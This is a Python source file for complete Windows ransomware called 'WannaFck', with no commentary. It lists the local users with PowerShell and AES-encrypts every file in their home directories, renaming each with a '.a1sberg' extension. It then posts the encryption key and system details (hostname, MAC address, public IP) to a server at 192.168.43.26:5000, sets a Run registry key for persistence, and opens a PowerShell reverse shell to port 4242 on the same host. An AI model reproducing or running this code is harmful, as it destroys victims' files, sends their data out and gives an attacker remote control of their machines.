import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import winreg
import base64
import requests
import socket
import threading
import subprocess as sp
import platform
from scapy.all import get_if_hwaddr, conf

class WannaFck:
    def __init__(self, key_size=32, iv_size=16):
        self.key = get_random_bytes(key_size)
        self.iv = get_random_bytes(iv_size)

    def encrypt_file(self, filepath):
        try:
            if filepath.endswith('.a1sberg'):
                return
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            with open(filepath, 'rb') as src:
                padded_data = pad(src.read(), AES.block_size)
            with open(filepath, 'wb') as dst:
                dst.write(self.iv + cipher.encrypt(padded_data))
            new_filepath = f"{filepath}.a1sberg"
            os.rename(filepath, new_filepath)
        except (PermissionError, OSError) as e:
            pass

    def encrypt_directory(self, directory):
        for root, _, files in os.walk(directory):
            for file in files:
                filepath = os.path.join(root, file)
                self.encrypt_file(filepath)

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text.strip()
        except requests.RequestException as e:
            return "N/A"

    def get_system_info(self):
        try:
            os_name = platform.system()
            hostname = socket.gethostname()
            user = os.getlogin()
            processor = platform.processor()
            architecture = platform.architecture()[0]
            mac_address = get_if_hwaddr(conf.iface) if conf.iface else "N/A"
            external_ip = self.get_public_ip()
            return {
                "Operating System": os_name,
                "Hostname": hostname,
                "User": user,
                "Processor": processor,
                "Architecture": architecture,
                "MAC Address": mac_address,
                "External IP": external_ip
            }
        except Exception as e:
            pass

    def exfiltrate_key(self, server_url):
        encoded_key = base64.b64encode(self.key).decode()
        system_info = self.get_system_info()
        payload = {
                "key": encoded_key,
                "system_info": system_info
        }
        requests.post(server_url, json=payload, headers={'Content-Type': 'application/json'})

    def get_enabled_users(self):
        command = 'Get-LocalUser | Where-Object {$_.Enabled -eq $true} | Select-Object -ExpandProperty Name'
        result = sp.run(["powershell", "-Command", command], capture_output=True, text=True)
        if result.returncode == 0:
            # Return a list of enabled users
            return result.stdout.strip().split("\n")
        else:
            return []

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def add_to_registry(self):
        exe_path = sys.executable
        try:
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            key_name = "wannafck"
            winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(registry_key)
        except Exception as e:
            pass

    def start(self):
        self.add_to_registry()
        conn = socket.socket()
        conn.connect((self.host, self.port))
        proc = sp.Popen(['powershell.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
        threading.Thread(target=lambda: [conn.send(os.read(proc.stdout.fileno(), 1024)) for _ in iter(int, 1)], daemon=True).start()
        threading.Thread(target=lambda: [os.write(proc.stdin.fileno(), conn.recv(1024)) for _ in iter(int, 1)], daemon=True).start()
        proc.wait()

if __name__ == "__main__":
    wannafck = WannaFck()
    enabled_users = wannafck.get_enabled_users()
    for user in enabled_users:
        user_directory = f"C:\\Users\\{user}"
        if os.path.exists(user_directory):
            wannafck.encrypt_directory(user_directory)
    wannafck.exfiltrate_key("http://192.168.43.26:5000/store-key")
    shell = ReverseShell('192.168.43.26', 4242)
    shell.start()

